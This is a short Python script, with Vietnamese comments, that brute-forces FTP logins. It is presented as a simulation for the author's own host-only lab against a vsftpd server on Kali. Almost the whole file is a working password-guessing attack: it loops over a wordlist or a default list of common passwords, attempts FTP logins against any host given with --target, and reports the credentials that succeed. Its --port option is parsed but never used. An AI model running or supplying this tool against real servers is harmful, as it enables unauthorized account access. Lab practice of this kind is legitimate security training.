#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ftp_bruteforce.py — Giả lập Brute Force FTP từ Windows vào FTP server (vsftpd) trên Kali.

Chỉ dùng trong LAB host-only của chính bạn.

Ví dụ:
    python ftp_bruteforce.py --target 192.168.56.20 --user ftpuser --passwords 123456,ftp,root
    python ftp_bruteforce.py --target 192.168.56.20 --user ftpuser --wordlist pass.txt
"""
import argparse
import sys
import time
from pathlib import Path
from ftplib import FTP, error_perm


def try_ftp(target, user, pwd, timeout):
    try:
        ftp = FTP()
        ftp.connect(target, timeout=timeout)
        ftp.login(user, pwd)
        ftp.quit()
        return True
    except error_perm:
        return False
    except Exception:
        return False


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--target", required=True)
    ap.add_argument("--port", type=int, default=21)
    ap.add_argument("--user", default="ftpuser")
    ap.add_argument("--wordlist", default=None)
    ap.add_argument("--passwords", default="123456,ftp,root,toor,admin,password")
    ap.add_argument("--delay", type=float, default=0.1)
    args = ap.parse_args()

    if args.wordlist:
        wl = Path(args.wordlist)
        if not wl.exists():
            print("Không thấy wordlist:", wl)
            return 1
        passwords = [l.strip() for l in wl.read_text(encoding="utf-8", errors="ignore").splitlines()
                     if l.strip()]
    else:
        passwords = [p.strip() for p in args.passwords.split(",") if p.strip()]

    print(f"[brute] FTP {args.user}@{args.target} với {len(passwords)} mật khẩu")
    hit = None
    for i, pwd in enumerate(passwords, 1):
        ok = try_ftp(args.target, args.user, pwd, timeout=4.0)
        if ok:
            hit = pwd
            print(f"    [HIT] {args.user}:{pwd}")
            break
        if i % 20 == 0:
            print(f"    ... đã thử {i}/{len(passwords)}")
        time.sleep(args.delay)
    print(f"[brute] Xong. Thành công: {hit if hit else 'không có'}")
    return 0


if __name__ == "__main__":
    sys.exit(main())
